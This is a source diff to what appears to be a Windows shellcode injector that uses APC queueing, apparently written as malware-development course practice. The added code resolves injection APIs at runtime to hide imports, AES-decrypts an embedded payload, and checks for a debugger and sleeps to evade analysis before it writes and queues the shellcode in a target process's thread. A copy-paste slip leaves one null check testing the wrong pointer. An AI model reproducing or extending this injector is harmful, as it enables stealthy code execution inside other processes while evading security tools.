@@ -41,6 +41,36 @@ unsigned char shellcode[] =
 
 SIZE_T scSize = sizeof(shellcode);
 
+typedef BOOL(WINAPI* pfnWriteProcessMemory)(
+    IN  HANDLE  hProcess,
+    IN  LPVOID  lpBaseAddress,
+    IN  LPCVOID lpBuffer,
+    IN  SIZE_T  nSize,
+    OUT SIZE_T* lpNumberOfBytesWritten
+    );
+
+typedef LPVOID(WINAPI* pfnVirtualAllocEx)(
+    IN           HANDLE hProcess,
+    IN OPTIONAL  LPVOID lpAddress,
+    IN           SIZE_T dwSize,
+    IN           DWORD  flAllocationType,
+    IN           DWORD  flProtect
+    );
+
+typedef DWORD(WINAPI* pfnQueueUserAPC)(
+    IN PAPCFUNC  pfnAPC,
+    IN HANDLE    hThread,
+    IN ULONG_PTR dwData
+    );
+
+typedef DWORD(WINAPI* pfnWaitForSingleObjectEx)(
+        IN HANDLE hHandle,
+        IN DWORD  dwMilliseconds,
+        IN BOOL   bAlertable
+    );
+
+
+
 // https://stackoverflow.com/a/55030118
 DWORD FindProcessId(const std::wstring& processName)
 {
@@ -103,11 +133,98 @@ DWORD FindThread(DWORD pid) {
     return thID;
 }
 
+// RTO Mal Dev course
+int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {
+    HCRYPTPROV hProv;
+    HCRYPTHASH hHash;
+    HCRYPTKEY hKey;
+
+    BOOL CryptAcquire = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
+    if (CryptAcquire == false) {
+        //printf("CryptAcquireContextW Failed: %d\n", GetLastError());
+        return -1;
+    }
+
+    BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
+    if (CryptCreate == false) {
+        //printf("CryptCreateHash Failed: %d\n", GetLastError());
+        return -1;
+    }
+
+    BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
+    if (CryptHash == false) {
+        //printf("CryptHashData Failed: %d\n", GetLastError());
+        return -1;
+    }
+
+    BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
+    if (CryptDerive == false) {
+        //printf("CryptDeriveKey Failed: %d\n", GetLastError());
+        return -1;
+    }
+
+    BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);
+    if (Crypt_Decrypt == false) {
+        //printf("CryptDecrypt Failed: %d\n", GetLastError());
+        return -1;
+    }
+
+    CryptReleaseContext(hProv, 0);
+    CryptDestroyHash(hHash);
+    CryptDestroyKey(hKey);
+
+    return 0;
+}
+
 int iQueueAPC(HANDLE pHandle, DWORD pID, unsigned char* payload, SIZE_T scSize) {
     
+    // ------------------------------------------------------------------------------------------------------------
+    pfnVirtualAllocEx pVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAllocEx");
+    if (pVirtualAllocEx == NULL) {
+        printf("[-] VirtualAllocEx [KERNL32] Failed     ->      [ %p ] [ %d ]\n", pVirtualAllocEx, GetLastError());
+        return -2;
+    }
+    printf("[*] VirtualAllocEx [KERNEL32] Address       ->      [ %p ]\n", pVirtualAllocEx);
+
+    pfnWriteProcessMemory pWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WriteProcessMemory");
+    if (pWriteProcessMemory == NULL) {
+        printf("[-] WriteProcessMemory [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pWriteProcessMemory, GetLastError());
+        return -2;
+    }
+    printf("[*] WriteProcessMemory [KERNEL32] Address     ->      [ %p ]\n", pWriteProcessMemory);
+
+    pfnQueueUserAPC pQueueUserAPC = (pfnQueueUserAPC)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "QueueUserAPC");
+    if (pQueueUserAPC == NULL) {
+        printf("[-] QueueUserAPC [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pQueueUserAPC, GetLastError());
+        return -2;
+    }
+    printf("[*] QueueUserAPC [KERNEL32] Address       ->      [ %p ]\n", pQueueUserAPC);
+
+    pfnWaitForSingleObjectEx pWaitForSingleObjectEx = (pfnWaitForSingleObjectEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WaitForSingleObjectEx");
+    if (pQueueUserAPC == NULL) {
+        printf("[-] QueueUserAPC [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pWaitForSingleObjectEx, GetLastError());
+        return -2;
+    }
+    printf("[*] QueueUserAPC [KERNEL32] Address       ->      [ %p ]\n", pWaitForSingleObjectEx);
+    // ------------------------------------------------------------------------------------------------------------
+
     SIZE_T bytesWritten;
     HANDLE tHandle = NULL;
 
+    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD pcNameLength = sizeof(pcName);
+
+    if (IsDebuggerPresent() == TRUE) {
+        return -3;
+    }
+    else {
+        if (!GetComputerNameA(pcName, &pcNameLength)) {
+            return -3;
+        }
+        printf("[SUCCESS] Computer Name   ->   [ %s ]\n", pcName);
+        printf("[INFO] Sleeping for 10\n");
+        SleepEx(10000, FALSE);
+    }
 
     DWORD tID = FindThread(pID);
     if (!tID) {
@@ -121,13 +238,13 @@ int iQueueAPC(HANDLE pHandle, DWORD pID, unsigned char* payload, SIZE_T scSize) 
     }
     printf("[+] Thread obtained [ %p ]\n", tHandle);
 
-    LPVOID rAlloc = VirtualAllocEx(pHandle, NULL, scSize, MEM_COMMIT, PAGE_READWRITE);
+    LPVOID rAlloc = pVirtualAllocEx(pHandle, NULL, scSize, MEM_COMMIT, PAGE_READWRITE);
     if (!rAlloc) {
         printf("[-] Memory Not Allocated [ %d ]\n", GetLastError());
         return -1;
     }
-    
-    if (!WriteProcessMemory(pHandle, rAlloc, payload, scSize, &bytesWritten)) {
+
+    if (!pWriteProcessMemory(pHandle, rAlloc, payload, scSize, &bytesWritten)) {
         printf("[-] Write memory Failed [ %d ]\n", GetLastError());
         return -1;
     }
@@ -138,10 +255,10 @@ int iQueueAPC(HANDLE pHandle, DWORD pID, unsigned char* payload, SIZE_T scSize) 
         return -3;
     }
 
-    DWORD qAPC = QueueUserAPC((PAPCFUNC)rAlloc, tHandle, NULL);
+    DWORD qAPC = pQueueUserAPC((PAPCFUNC)rAlloc, tHandle, NULL);
     if (qAPC != 0) {
         printf("[+] APC Succeeded [ %d ]\n", qAPC);
-        WaitForSingleObjectEx(tHandle, INFINITE, FALSE);
+        pWaitForSingleObjectEx(tHandle, INFINITE, FALSE);
     }
     else {
         printf("[-] APC Failed [ %d ]\n", qAPC);
